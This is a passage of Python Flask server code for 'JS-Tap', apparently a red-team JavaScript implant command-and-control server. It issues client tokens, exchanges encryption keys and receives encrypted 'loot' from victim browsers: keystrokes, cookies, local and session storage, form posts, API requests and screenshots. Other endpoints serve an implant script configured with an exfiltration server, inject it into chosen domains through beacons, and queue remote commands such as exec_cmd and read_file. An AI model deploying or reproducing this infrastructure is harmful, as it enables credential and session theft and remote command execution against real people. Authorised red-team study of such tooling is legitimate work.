            credFile.close()
    else:
        # already have an admin!
        logger.info("Skipping admin add, already have one!")




# Initialize app defaults
def initApplicationDefaults():
    appSettings = AppSettings(allowNewSessions=True, clientRefreshRate=5, emailDelay=600, emailEnable=False, emailEventType='newClients')

    db_session.add(appSettings)
    dbCommit()




# Generate a client nickname
# If a client already has the nickname, append a number to 
# the end so they're unique
def generateNickname():
    randomAdjective = random.choice(list(AdjectiveList))
    randomColor     = random.choice(list(ColorList))
    randomCritter   = random.choice(list(MurderCritter))

    baseNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
    newNickname  = baseNickname

    counter = 0
    while Client.query.filter_by(nickname=newNickname).count():
        counter += 1
        newNickname = baseNickname + '-' + str(counter)

    return newNickname






#***************************************************************************
# Database startup

# Moved from main:
# Check for existing database file
# Make sure only one process runs this
startupLock  = FileLock("./init.lock")
emailLock    = FileLock("./email.lock")
lockAcquired = False

try:
    startupLock.acquire(timeout=2)
    lockAcquired = True
    printHeader()
    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
        with app.app_context():
            logger.info("!! SQLite database already exists:")
            clients = Client.query.all()
            numClients = len(clients)

            users = User.query.all()
            numUsers = len(users)

            logger.info("Existing database has " + str(numClients) + " clients and " 
                + str(numUsers) + " users.")

            # Generate a new admin user
            logger.info("Creating tables!")
            User.__table__.drop(engine)
            Base.metadata.create_all(engine)
            dbCommit()
            addAdminUser()

            # If we're being run from the gunicorn start script this will be set by that
            clientSaveSetting = os.environ.get('CLIENTDATA')


            if numClients != 0:
                val = ""

                # See if we're started from gunicorn startup script
                if clientSaveSetting is not None:
                    if clientSaveSetting == 'KEEP':
                        val = 1
                    elif clientSaveSetting == 'DELETE':
                        val = 2
                else:
                    # apparently running developer mode directly
                    print("Make selection on how to handle existing clients:")
                    print("1 - Keep existing client data")
                    print("2 - Delete all client data and start fresh")

                    val = int(input("\nSelection: "))


                if val == 2:
                    logger.info("Clearing client data")
                    Client.__table__.drop(engine)
                    Screenshot.__table__.drop(engine)
                    HtmlCode.__table__.drop(engine)
                    UrlVisited.__table__.drop(engine)
                    UserInput.__table__.drop(engine)
                    Cookie.__table__.drop(engine)
                    LocalStorage.__table__.drop(engine)
                    SessionStorage.__table__.drop(engine)
                    XhrApiCall.__table__.drop(engine)
                    XhrHeader.__table__.drop(engine)
                    FetchApiCall.__table__.drop(engine)
                    FetchHeader.__table__.drop(engine)
                    Event.__table__.drop(engine)
                    FormPost.__table__.drop(engine)
                    CustomExfil.__table__.drop(engine)
                    ClientPayloadJob.__table__.drop(engine)
                    BeaconDomain.__table__.drop(engine)
                    BeaconVisit.__table__.drop(engine)
                    BeaconCapture.__table__.drop(engine)
                    BeaconInjection.__table__.drop(engine)
                    PluginActivation.__table__.drop(engine)
                    PluginData.__table__.drop(engine)
                    db_session.execute(update(AppSettings).where(AppSettings.id==1).values(emailContent="", lastEmailSent=None))
                    dbCommit()

                    Base.metadata.create_all(engine)

                    if os.path.exists(dataDirectory + "lootFiles"):
                        shutil.rmtree(dataDirectory + "lootFiles")

                elif val == 1:
                    logger.info("Keeping existing client data.")
                else:
                    print("Invalid selection.")
                    exit()


    else:
        logger.info("No database found")
        logger.info("... creating database...")
        with app.app_context():
            Base.metadata.drop_all(engine)
            Base.metadata.create_all(engine)

            if os.path.exists(dataDirectory + "lootFiles"):
                shutil.rmtree(dataDirectory + "lootFiles")
            dbCommit()
            addAdminUser()
            initApplicationDefaults()



    # Check for loot directory
    if not os.path.exists(dataDirectory + "lootFiles"):
        os.mkdir(dataDirectory + "lootFiles")

    # Load plugins
    loadPlugins()

    # Set our journaling mode to wright ahead log
    @event.listens_for(Engine, "connect")
    def set_sqlite_pragma(dbapi_connection, connection_record):
        try:
            cursor = dbapi_connection.cursor()
            cursor.execute("PRAGMA journal_mode=WAL;")
            cursor.execute("PRAGMA synchronous=normal;")
            cursor.execute("PRAGMA cache_size = -20971520;") # 20MB
            cursor.close()
        except Exception as e:
            logger.error(f"Error setting SQLite PRAGMAs: {e}")


    # Start our background notification email checker
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=timedEmailNotificationCheck, trigger="interval", seconds=120)    
    scheduler.start()

    # Need the other threads to move on beyond the init code
    time.sleep(5)


except Timeout:
    logger.info("Server process skipping redundant startup initialization")

finally:
    if lockAcquired:
        logger.info("Releasing startup filelock")
        startupLock.release()
        logger.info("************************************")
        logger.info("JS-Tap Server Online - Happy Hunting")
        logger.info("************************************")




#***************************************************************************
# Response header handling
@app.after_request
def afterRequestHeaders(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options']    = 'nosniff'
    response.headers['X-Frame-Options']           = 'DENY'
    response.headers['Content-Security-Policy']   = (
        "default-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "script-src 'self' 'unsafe-inline'; "
        "connect-src 'self'; "
        "img-src 'self' data:; "
        "frame-ancestors 'none'; "
        "object-src 'self'"
    )
    # Server header is set in main function
 
    return response




# Page Endpoints


# Serve up a whole directory just for different configurations 
# of JS-Tap payloads. No authentication required to pull these in
# Have different ones/configurations for different applications
# Put your payloads in thte ./payloads directory. 
@app.route('/lib/<path:filename>')
def servePayloads(filename):
    response = send_from_directory('./payloads', filename)

    response.headers['Content-Type'] = 'text/javascript'

    return response



# Send c2 UI index page
@app.route('/', methods=['GET'])
@login_required
def sendIndex():
    with open('./index.html', 'r') as file:
        index = file.read()
        response = make_response(index, 200)
        #response.mimetype('text/html')

        return response



# Serve up loot files
# for images and HTML code
@app.route('/lootFiles/<path:path>')
@login_required
def sendLootFile(path):

    # If HTML the user needs to download it the loot file, not render it
    # Rendering the HTML copy in the browswer will likely hit the target server
    # with CSS/JavaScript requests from our browser. No good. 
    if "htmlCopy.html" in path:
        # logger.info("### We're serving up stolent HTML!")
        return send_from_directory(dataDirectory + 'lootFiles', path, as_attachment=True)
    else:
        # Just display the screenshot in the browser, this is safe
        # logger.info("#### Serving up screenshot!")    
        return send_from_directory(dataDirectory + 'lootFiles', path)


# Serve up static files
# that need to be authenticated
@app.route('/protectedStatic/<path:path>')
@login_required
def sendProtectedStaticFile(path):
    response = send_from_directory('protectedStatic', path)
    if path.endswith('.js') or path.endswith('.css'):
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response





@app.route('/login', methods=['POST', 'GET'])
def login():
    logger.info("Top of login...")

    if request.method == 'GET':
        logger.info("** Handling login GET...")
        with open('./login.html', 'r') as file:
            loginForm = file.read()
            response = make_response(loginForm, 200)
            #response.mimetype('text/html')

            return response


    if request.method == 'POST':
        logger.info("** Handling login POST...")
        username = request.form['username']
        password = request.form['password']

        user = User.query.filter_by(username=username).first()

        if user:
            isValidPassword = bcrypt.check_password_hash(user.password, password) 

            if isValidPassword:
                logger.info("Password matched!")
                login_user(user)
                return redirect(url_for('sendIndex'))
                # response = make_response("Successful login.", 200)
                # return response
            else:
                logger.info("Auth: Password didn't match")
                response = make_response("No.", 401)
                return response
                logger.info("Password didn't match :(")
        else:
            # Make sure equal processing time, avoiding time based user enum
            hash = bcrypt.generate_password_hash(password)

            logger.info("Auth: User not found")
            response = make_response("No.", 401)
            return response



@app.route('/logout', methods=['GET'])
def logout():
    logout_user()
    return redirect("login")


#***************************************************************************
# Loot and Payload Client API endpoints

# Get UUID for client token
@app.route('/client/getToken', methods=['GET'])
@app.route('/client/getToken/<tag>', methods=['GET'])
@app.route('/client/getToken/<tag>/<clientType>', methods=['GET'])
def returnUUID(tag='', clientType='js-implant'):
    # Check for parent link if spawned from a beacon
    parentUUID = request.args.get('parent')

    # Check to see if we're still allowing new sessions
    appSettings = AppSettings.query.filter_by(id=1).first()

    # logger.info("In UUID, app setting is: " + str(appSettings.allowNewSessions))
    if (appSettings.allowNewSessions == False):
        return "No.", 401

    # Is this IP blocked?
    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr
 
    blockedIP = BlockedIP.query.filter_by(ip=ip).first()
    if blockedIP is not None:
        return "No.", 401


    # We're still allowing new connections, 
    # setup a new client
    token = str(uuid.uuid4())

    logger.info("New session for client: " + token + " (" + clientType + ")")

    # Capture User-Agent
    userAgent = request.headers.get('User-Agent')
    parsedUserAgent = parse(userAgent)
    platform  = parsedUserAgent.os.family
    browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string


    # Database Entry
    newNickname = generateNickname()
    newClient   = Client(uuid=str(token), parentUUID=parentUUID, nickname=newNickname, tag=tag, clientType=clientType, ipAddress=ip, platform=platform, browser=browser, rawUserAgent=userAgent, notes="", receiveKey=None, sendKey=None)
    db_session.add(newClient)
    db_session.commit()

    # Initialize our storage
    lootPath = dataDirectory + 'lootFiles/client_' + str(newClient.id)

    if not os.path.exists(lootPath):
        #logger.info("Creating directory...")
        os.mkdir(lootPath)

        # Record the client index
        clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
        clientFile.write(str(time.time()) + ", " + token + ": " + lootPath + "\n")
        clientFile.close()
    # threadLock.release()

    # Add any autorun payloads for this client
    payloads = CustomPayload.query.filter_by(autorun=True)
    client   = Client.query.filter_by(uuid=token).first()

    scheduledPayloadIds = set()
    for payload in payloads:
        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
        db_session.add(newJob)
        scheduledPayloadIds.add(payload.id)

    # Add target rule repeat payloads for this new client
    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
    for rule in targetRules:
        if rule.payloadKey in scheduledPayloadIds:
            continue
        if clientMatchesFilter(client, rule.filterQuery):
            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
            if payload:
                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
                db_session.add(newJob)
                scheduledPayloadIds.add(payload.id)

    dbCommit()

    # Check if we need to send a notification email
    backgroundExecutor.submit(newClientNotificationEmail, token)


    uuidData = {'clientToken':token}

    return jsonify(uuidData)



# RSA-OAEP key exchange: client sends its public key,
# server encrypts AES keys with it and returns the ciphertext
@app.route('/client/keyExchange/<identifier>', methods=['POST'])
def keyExchange(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    appSettings = AppSettings.query.filter_by(id=1).first()
    client = Client.query.filter_by(uuid=identifier).first()

    encryptionData = {}

    if appSettings.obfuscateTraffic or (client and client.clientType in ('bex-beacon', 'atom-beacon')):
        # Generate AES keys if they don't exist yet for this session
        if client.receiveKey is None or client.sendKey is None:
            receiveKey = os.urandom(32)
            sendKey    = os.urandom(32)

            client.receiveKey = receiveKey
            client.sendKey    = sendKey

            db_session.add(client)
            dbCommit()
        else:
            receiveKey = client.receiveKey
            sendKey    = client.sendKey

        # Parse the client's RSA public key from the request
        content = request.json
        clientPubKeyDer = base64.b64decode(content['publicKey'])
        clientPublicKey = load_der_public_key(clientPubKeyDer)

        # Encrypt receiveKey + sendKey (64 bytes) with RSA-OAEP
        # Client assigns: first 32 bytes = its sendKey, next 32 = its receiveKey
        # So: client encrypts with receiveKey (server decrypts with client.receiveKey) ✓
        #     server encrypts with sendKey (client decrypts with client.sendKey) ✓
        plaintextKeys = receiveKey + sendKey
        encryptedKeys = clientPublicKey.encrypt(
            plaintextKeys,
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        encryptionData["enable"]        = "true"
        encryptionData["encryptedKeys"] = base64.b64encode(encryptedKeys).decode("utf-8")
    else:
        encryptionData["enable"] = "false"

    return jsonify(encryptionData)




# Receive encrypted data from js-tap client
# Used when obfuscation is enabled in App Settings (UI menu in portal)
@app.route('/client/metrics/<identifier>', methods=['POST'])
def receiveEncryptedMessage(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    userAgent = request.headers.get('User-Agent')
   
    content = request.json
    payload = content['metricData']

    parts = payload.split(',')

    if len(parts) != 3:
        logger.error("Invalid numer of parts in /client/metrics")

    iv = base64.b64decode(parts[0])

    pathCipherText = base64.b64decode(parts[1])

    messageCipherText = base64.b64decode(parts[2])

    client = Client.query.filter_by(uuid=identifier).first()
    aesgcm = AESGCM(client.receiveKey)

    try:
        path    = aesgcm.decrypt(iv, pathCipherText, None)
        message = aesgcm.decrypt(iv, messageCipherText, None)
        
        # If we successfully decrypted, this client is definitely crypto-capable
        if client and not client.cryptoActive:
            client.cryptoActive = True
            dbCommit()
            logger.info(f"Client {identifier} automatically confirmed crypto-active via successful decryption.")
    except Exception as e:
        logger.error(f"Failed to decrypt message for {identifier}: {e}")
        return "No.", 400

    if path.decode('utf-8') == "/client/fingerprint":
        logger.info("Received encrypted fingerprint message")
        saveFingerprint(identifier, message.decode('utf-8'))

    elif path.decode('utf-8') == "/loot/html":
        logger.info("Received encrypted HTML dump message")
        jsonData = json.loads(message.decode('utf-8'))
        url         = jsonData['url']
        htmlContent = jsonData['html']
        saveHTML(identifier, url, htmlContent, ip, userAgent)

    elif path.decode('utf-8') == "/loot/input":
        logger.info("Received encrypted input message")
        jsonData = json.loads(message.decode('utf-8'))
        saveInput(identifier, jsonData, ip, userAgent)
 
    elif path.decode('utf-8') == "/loot/location":
        logger.info("Received encrypted location message")
        jsonData = json.loads(message.decode('utf-8'))
        url      = jsonData['url']
        saveUrl(identifier, url, ip, userAgent)

    elif path.decode('utf-8') == "/loot/dessert":
        logger.info("Received encrypted cookie message")
        jsonData = json.loads(message.decode('utf-8'))
        cookieName  = jsonData['cookieName']
        cookieValue = jsonData['cookieValue']
        saveCookie(identifier, cookieName, cookieValue, ip, userAgent)

    elif path.decode('utf-8') == "/loot/localstore":
        logger.info("Received encrypted local storage message")
        jsonData = json.loads(message.decode('utf-8'))
        localStorageKey   = jsonData['key']
        localStorageValue = jsonData['value']
        saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, userAgent)

    elif path.decode('utf-8') == "/loot/sessionstore":
        logger.info("Received encrypted session storage message")
        jsonData = json.loads(message.decode('utf-8'))
        sessionStorageKey    = jsonData['key']
        sessionStorageValue = jsonData['value']
        saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent)

    elif path.decode('utf-8') == "/loot/keylog":
        logger.info("Received encrypted keylog message")
        jsonData = json.loads(message.decode('utf-8'))
        saveKeylog(identifier, jsonData.get('keys', ''), jsonData.get('target', ''),
                   jsonData.get('url', ''), ip, userAgent)

    elif path.decode('utf-8') == "/loot/xhrRequest":
        logger.info("Received encrypted xhrRequest message")
        jsonData = json.loads(message.decode('utf-8'))
        saveXhrDump(identifier, jsonData, ip, userAgent)

    elif path.decode('utf-8') == "/loot/fetchRequest":
        logger.info("Received encrypted fetchRequest message")
        jsonData = json.loads(message.decode('utf-8'))
        saveFetchDump(identifier, jsonData, ip, userAgent)

    elif path.decode('utf-8') == "/loot/formPost":
        logger.info("Received encrypted formPost message")
        jsonData = json.loads(message.decode('utf-8'))
        saveFormPost(identifier, jsonData, ip, userAgent)
    
    elif path.decode('utf-8') == "/loot/customData":
        logger.info("Received encrypted custom data exfil message")
        jsonData = json.loads(message.decode('utf-8'))
        note     = jsonData['note']
        data     = jsonData['data']
        saveCustomExfil(identifier, note, data, ip, userAgent)

    elif path.decode('utf-8').startswith("/plugin/data/"):
        pluginId = path.decode('utf-8').split('/')[3]
        logger.info(f"Received encrypted plugin data for plugin: {pluginId}")
        jsonData = json.loads(message.decode('utf-8'))
        dataType = jsonData.get('dataType', 'generic')
        newData = PluginData(clientID=identifier, pluginId=pluginId,
                             dataType=dataType, data=json.dumps(jsonData.get('data', {})))
        db_session.add(newData)
        clientSeen(identifier, ip, userAgent)
        dbCommit()
        db_session.refresh(newData)
        db_session.add(Event(clientID=identifier, timeStamp=newData.timeStamp,
                             eventType='PLUGIN', eventID=newData.id))
        dbCommit()

    elif path.decode('utf-8') == "/bex/report":
        logger.info("Received encrypted BEX report message")
        jsonData = json.loads(message.decode('utf-8'))
        # jsonData can contain a list of objects now: [{domain: '...', url: '...'}]
        # Backward compatibility check if it's just domains (though we control the client)
        
        items = jsonData.get('visits', [])
        # If 'visits' is empty, maybe it's the old format with 'domains' (just in case)
        if not items:
             old_domains = jsonData.get('domains', [])
             for d in old_domains:
                 saveBeaconVisit(identifier, d, None, ip, userAgent)
        else:
            for item in items:
                domain = item.get('domain')
                url    = item.get('url')
                saveBeaconVisit(identifier, domain, url, ip, userAgent)

    elif path.decode('utf-8') == "/bex/capture":
        logger.info("Received encrypted BEX capture message")
        jsonData = json.loads(message.decode('utf-8'))
        domain      = jsonData.get('domain')
        captureType = jsonData.get('type')
        name        = jsonData.get('name')
        value       = jsonData.get('value')
        url         = jsonData.get('url') # Optional URL
        extraData   = jsonData.get('metadata') # Optional JSON metadata (cookie flags, etc.)
        saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url, extraData)

    elif path.decode('utf-8').startswith("/bex/screenshot/"):
        targetUUID = path.decode('utf-8').replace("/bex/screenshot/", "")
        logger.info(f"Received proxied BEX screenshot for {targetUUID}")
        saveScreenshot(targetUUID, message, ip, userAgent)

    elif path.decode('utf-8') == "/loot/screenshot":
        logger.info("Received encrypted screenshot message")
        saveScreenshot(identifier, message, ip, userAgent)

    elif path.decode('utf-8') == "/client/taskCheck":
        logger.info("Received encrypted task check request message")
        return createTaskResponse(identifier)

    elif path.decode('utf-8') == "/beacon/status":
        logger.info("Received beacon status update")
        jsonData = json.loads(message.decode('utf-8'))
        client = Client.query.filter_by(uuid=identifier).first()
        if client:
            client.sidecarSupported = jsonData.get('supported', False)
            # Atom-beacon has built-in capabilities — treat as always connected
            if client.clientType == 'atom-beacon':
                client.sidecarConnected = client.sidecarSupported
            elif 'connected' in jsonData:
                client.sidecarConnected = jsonData.get('connected', False)
            client.lastSeen = datetime.datetime.now(datetime.timezone.utc)
            dbCommit()

    elif path.decode('utf-8') == "/bex/sidecar/status":
        logger.info("Received sidecar status update")
        jsonData = json.loads(message.decode('utf-8'))
        client = Client.query.filter_by(uuid=identifier).first()
        if client:
            client.sidecarSupported = jsonData.get('supported', False)
            if 'connected' in jsonData:
                client.sidecarConnected = jsonData.get('connected', False)
            dbCommit()

    elif path.decode('utf-8') == "/bex/sidecar/result":
        logger.info("Received sidecar command result")
        jsonData = json.loads(message.decode('utf-8'))
        newResult = SidecarResult(
            clientID=identifier,
            requestId=jsonData.get('requestId', ''),
            command=jsonData.get('command', ''),
            success=jsonData.get('success', False),
            data=json.dumps(jsonData.get('data')) if jsonData.get('data') else None,
            error=jsonData.get('error')
        )
        db_session.add(newResult)
        dbCommit()

    else:
        logger.error("Invalid path in receiveEncryptedMessage")


    return "ok", 200







# unencrypted and encrypted calls end up here 
def saveFingerprint(identifier, fingerprint):
    client = Client.query.filter_by(uuid=identifier).first()
    client.fingerprint = fingerprint 

    db_session.add(client)
    dbCommit()




# Report the client fingerprint if setup to calculate one
@app.route('/client/fingerprint/<identifier>', methods=['POST'])
def setFingerprint(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content     = request.json
    fingerprint = content['fingerprint']

    saveFingerprint(identifier, fingerprint)
    # client = Client.query.filter_by(uuid=identifier).first()
    # client.fingerprint = fingerprint 

    # db_session.add(client)
    # dbCommit()

    return "ok", 200


def generate_injection_payload(tag, server_url):
    with open('telemlib.js', 'r') as file:
        payload = file.read()
    
    # Configure the payload for injection using regex to handle variations in whitespace/tabs
    
    # Replace Mode
    payload = re.sub(r'window\.taperMode\s*=\s*".*?";', 'window.taperMode = "implant";', payload)
    
    # Replace Exfil Server
    payload = re.sub(r'window\.taperexfilServer\s*=\s*".*?";', f'window.taperexfilServer = "{server_url}";', payload)
    
    # Replace Tag
    payload = re.sub(r'window\.taperTag\s*=\s*".*?";', f'window.taperTag = "{tag}";', payload)
    
    return base64.b64encode(payload.encode('utf-8')).decode('utf-8')


@app.route('/lib/injected/<beaconID>/<path:domain>')
def serveDynamicInjectedPayload(beaconID, domain):
    logger.info(f"BEX: Dynamic payload request for {domain} from beacon {beaconID}")
    # Look up the injection record
    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain, active=True).first()
    
    if not injection:
        logger.warning(f"BEX: No active injection record found for {domain} and beacon {beaconID}")
        return "No.", 404

    # Mark as successful since the script is being requested
    injection.last_success = func.now()
    dbCommit()

    with open('telemlib.js', 'r') as file:
        payload = file.read()
    
    # Use the server's root URL for the exfil server
    server_url = request.url_root.rstrip('/')
    if 'localhost' in server_url:
        server_url = server_url.replace('localhost', '127.0.0.1')

    # Ensure protocol matches
    if request.is_secure:
        if server_url.startswith('http://'):
            server_url = server_url.replace('http://', 'https://')
    
    logger.info(f"BEX: Serving payload for {domain} configured with exfil server {server_url} and tag {injection.tag} (Parent: {beaconID})")

    # Perform the replacements using regex to handle variations in whitespace/tabs
    import re
    
    # Replace Mode
    payload = re.sub(r'window\.taperMode\s*=\s*".*?";', 'window.taperMode = "implant";', payload)
    
    # Replace Exfil Server
    payload = re.sub(r'window\.taperexfilServer\s*=\s*".*?";', f'window.taperexfilServer = "{server_url}";', payload)

    # Replace Tag
    payload = re.sub(r'window\.taperTag\s*=\s*".*?";', f'window.taperTag = "{injection.tag}";', payload)
    
    # Inject the Parent UUID for linkage
    payload = payload.replace('window.taperMode = "implant";', f'window.taperMode = "implant";\n\twindow.taperParentUUID = "{beaconID}";')
    
    response = make_response(payload, 200)
    response.headers['Content-Type'] = 'text/javascript'
    # Disable caching for the dynamic script
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response


@app.route('/api/bex/server_url', methods=['GET'])
@login_required
def getBexServerUrl():
    try:
        with open('bex-beacon/config.json', 'r') as f:
            cfg = json.load(f)
        domain = cfg['js_tap_server']['domain']
        port   = cfg['js_tap_server']['port']
        return jsonify({"serverUrl": f"https://{domain}:{port}"})
    except Exception as e:
        logger.warning(f"BEX: Could not read bex-beacon config: {e}")
        return jsonify({"serverUrl": ""})


@app.route('/api/bex/inject', methods=['POST'])
@login_required
def enableBexInjection():
    content = request.json
    beaconID_raw = content.get('beaconID')
    domain       = content.get('domain')
    tag          = content.get('tag')
    serverUrl    = content.get('serverUrl', '').strip()

    # Resolve client to ensure we have the UUID even if the UI sent the internal ID
    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()

    if not client:
        logger.warning(f"BEX: Client not found for injection: {beaconID_raw}")
        return "Client not found", 404

    beaconID = client.uuid
    logger.info(f"BEX: Enabling injection for {domain} via beacon {beaconID} (ID: {client.id}) with tag {tag}")

    # Upsert logic
    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain).first()
    if injection:
        injection.active = True
        injection.tag = tag
    else:
        newInjection = BeaconInjection(beaconID=beaconID, domain=domain, tag=tag, active=True)
        db_session.add(newInjection)

    dbCommit()

    # Queue a configuration task for the beacon (client is already found above)
    # Send the LOADER URL, not the whole code
    # If a custom C2 server URL is provided, build an absolute URL so the beacon
    # uses it as-is (useful for domain fronting). Otherwise use a relative path.
    if serverUrl:
        loader_url = f"{serverUrl.rstrip('/')}/lib/injected/{beaconID}/{domain}"
        logger.info(f"BEX: Queuing absolute loader URL: {loader_url}")
    else:
        loader_url = f"/lib/injected/{beaconID}/{domain}"
        logger.info(f"BEX: Queuing relative loader URL: {loader_url}")
    
    taskData = {
        "type": "CONFIG_INJECTION",
        "domain": domain,
        "active": True,
        "url": loader_url
    }
    
    jsonStr = json.dumps(taskData)
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
    db_session.add(newJob)
    dbCommit()

    return "ok", 200


@app.route('/api/bex/stop_inject', methods=['POST'])
@login_required
def disableBexInjection():
    content = request.json
    beaconID_raw = content.get('beaconID')
    domain       = content.get('domain')

    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    
    if not client:
        logger.warning(f"BEX: Client not found for stop_injection: {beaconID_raw}")
        return "Client not found", 404
        
    beaconID = client.uuid
    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain).first()
    if injection:
        injection.active = False
        dbCommit()
        
        # Queue task to disable
        taskData = {
            "type": "CONFIG_INJECTION",
            "domain": domain,
            "active": False,
            "url": ""
        }
        jsonStr = json.dumps(taskData)
        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
        db_session.add(newJob)
        dbCommit()

    return "ok", 200


@app.route('/api/bex/injections/<beaconID_raw>', methods=['GET'])
@login_required
def getBexInjections(beaconID_raw):
    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    
    if not client:
        return jsonify([])

    injections = BeaconInjection.query.filter_by(beaconID=client.uuid, active=True).all()
    data = [{'domain': i.domain, 'tag': i.tag, 'last_success': i.last_success} for i in injections]
    return jsonify(data)


# Sidecar API endpoints

@app.route('/api/sidecar/command', methods=['POST'])
@login_required
def sendSidecarCommand():
    """Queue a sidecar command for a beacon to execute."""
    content = request.json
    beaconID_raw = content.get('beaconID')
    command = content.get('command')  # list_dir, read_file, exec_cmd
    args = content.get('args', {})

    if not command:
        return "Missing command", 400

    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    if not client:
        return "Client not found", 404
    if not client.sidecarSupported:
        return "Sidecar not supported by this beacon", 400

    requestId = str(uuid.uuid4())

    if command == 'screenshot':
        taskData = {
            "type": "SCREENSHOT",
            "requestId": requestId,
            "args": args
        }
    elif command == 'screenshot_settings':
        taskData = {
            "type": "SCREENSHOT_SETTINGS",
            "requestId": requestId,
            "args": args
        }
    else:
        taskData = {
            "type": "SIDECAR_COMMAND",
            "requestId": requestId,
            "command": command,
            "args": args
        }
    jsonStr = json.dumps(taskData)
    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
    db_session.add(newJob)
    dbCommit()

    return jsonify({"requestId": requestId}), 200


@app.route('/api/sidecar/results/<beaconID_raw>', methods=['GET'])
@login_required
def getSidecarResults(beaconID_raw):
    """Get sidecar results for a beacon."""
    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    if not client:
        return jsonify([])

    requestId = request.args.get('requestId')
    query = SidecarResult.query.filter_by(clientID=client.uuid)
    if requestId:
        query = query.filter_by(requestId=requestId)

    results = query.order_by(SidecarResult.timeStamp.desc()).limit(50).all()
    data = [{
        'id': r.id,
        'requestId': r.requestId,
        'command': r.command,
        'success': r.success,
        'data': json.loads(r.data) if r.data else None,
        'error': r.error,
        'timeStamp': str(r.timeStamp)
    } for r in results]

    return jsonify(data)


@app.route('/api/sidecar/result/<requestId>', methods=['GET'])
@login_required
def getSidecarResult(requestId):
    """Poll for a specific sidecar result by requestId."""
    result = SidecarResult.query.filter_by(requestId=requestId).first()
    if not result:
        return jsonify({"ready": False})

    return jsonify({
        "ready": True,
        "id": result.id,
        "command": result.command,
        "success": result.success,
        "data": json.loads(result.data) if result.data else None,
        "error": result.error,
        "timeStamp": str(result.timeStamp)
    })


#***************************************************************************
# Plugin API Routes

@app.route('/api/plugins', methods=['GET'])
@login_required
def listPlugins():
    """List all loaded plugin manifests."""
    result = []
    for pid, plugin in PLUGINS.items():
        result.append(plugin['manifest'])
    return jsonify(result)


@app.route('/api/plugins/<pluginId>/ui', methods=['GET'])
@login_required
def getPluginUI(pluginId):
    """Return HTML for dashboard plugin UI."""
    plugin = PLUGINS.get(pluginId)
    if not plugin:
        return "Plugin not found", 404
    return jsonify({
        'html': plugin.get('ui.html'),
        'hasJs': plugin.get('ui.js') is not None
    })


@app.route('/api/plugins/<pluginId>/ui.js', methods=['GET'])
@login_required
def getPluginUIScript(pluginId):
    """Serve plugin UI JS as a script file (CSP-compliant)."""
    plugin = PLUGINS.get(pluginId)
    if not plugin or not plugin.get('ui.js'):
        return "Not found", 404
    # Wrap the plugin JS so it reads its API from the global registry
    wrappedJs = (
        '(function() {\n'
        '  var pluginUI = window.__pluginUIRegistry && window.__pluginUIRegistry["' + pluginId + '"];\n'
        '  if (!pluginUI) { console.error("No pluginUI context for ' + pluginId + '"); return; }\n'
        '  ' + plugin.get('ui.js') + '\n'
        '})();\n'
    )
    response = make_response(wrappedJs)
    response.headers['Content-Type'] = 'application/javascript'
    return response


@app.route('/api/plugins/<pluginId>/activate', methods=['POST'])
@login_required
def activatePlugin(pluginId):
    """Activate a plugin on a client."""
    plugin = PLUGINS.get(pluginId)
    if not plugin:
        return "Plugin not found", 404

    content = request.json
    clientID = content.get('clientID')
    settings = content.get('settings', {})

    client = Client.query.filter_by(id=clientID).first()
    if not client:
        client = Client.query.filter_by(uuid=clientID).first()
    if not client:
        return "Client not found", 404

    # Upsert PluginActivation
    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
    if existing:
        existing.active = True
        existing.settings = json.dumps(settings)
    else:
        activation = PluginActivation(clientID=client.uuid, pluginId=pluginId,
                                       active=True, settings=json.dumps(settings))
        db_session.add(activation)
    dbCommit()

    # Queue PLUGIN_LOAD task
    taskData = {
        "type": "PLUGIN_LOAD",
        "pluginId": pluginId,
        "settings": settings,
        "mainCode": plugin.get('main.js'),
        "rendererCode": plugin.get('renderer.js')
    }
    jsonStr = json.dumps(taskData)
